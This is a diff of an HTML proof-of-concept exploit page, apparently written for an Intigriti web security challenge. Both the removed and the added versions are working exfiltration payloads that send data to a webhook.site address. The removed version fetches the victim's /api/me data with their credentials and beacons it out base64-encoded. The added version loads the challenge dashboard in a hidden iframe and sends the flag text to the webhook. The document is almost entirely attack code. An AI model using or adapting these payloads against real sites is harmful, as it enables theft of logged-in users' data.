@@ -1,41 +1,28 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Exploit Page</title>
-</head>
+<html>
+<head><title>PoC</title></head>
 <body>
-    <h1>Processing... Please wait.</h1>
-    <script>
-        (function() {
-            const CHALLENGE_API = 'https://challenge-0126.intigriti.io/api/me';
-            const MY_WEBHOOK = 'https://webhook.site/e82ea658-d5c8-43c1-ad91-91b356a3e165';
+<script>
+const W='https://webhook.site/e82ea658-d5c8-43c1-ad91-91b356a3e165';
+const T='https://challenge-0126.intigriti.io';
 
-            // 1. طلب البيانات من الـ API
-            fetch(CHALLENGE_API, {
-                method: 'GET',
-                credentials: 'include'
-            })
-            .then(response => {
-                if (!response.ok) throw new Error('Not logged in');
-                return response.json();
-            })
-            .then(data => {
-                // 2. تحويل البيانات لنص ثم Base64
-                const encodedData = btoa(JSON.stringify(data));
-                
-                // 3. إرسال البيانات عن طريق إنشاء صورة (هذه الطريقة لا تفشل أبداً)
-                const logger = new Image();
-                logger.src = MY_WEBHOOK + '?data=' + encodedData;
-                
-                console.log('Data sent successfully!');
-            })
-            .catch(err => {
-                // في حالة الخطأ، أرسل رسالة الخطأ للـ Webhook لتعرف السبب
-                const errorLogger = new Image();
-                errorLogger.src = MY_WEBHOOK + '?error=' + btoa(err.message);
-            });
-        })();
-    </script>
+// Try direct redirect (most likely to work)
+new Image().src=W+'?status=started';
+setTimeout(()=>location.href=T+'/dashboard.html',1000);
+
+// Backup: try iframe
+const f=document.createElement('iframe');
+f.src=T+'/dashboard.html';
+f.style.display='none';
+document.body.appendChild(f);
+setTimeout(()=>{
+  try{
+    const flag=f.contentDocument.getElementById('flagText')?.textContent;
+    if(flag)new Image().src=W+'?flag='+encodeURIComponent(flag);
+  }catch(e){
+    new Image().src=W+'?error='+e.message;
+  }
+},3000);
+</script>
 </body>
 </html>
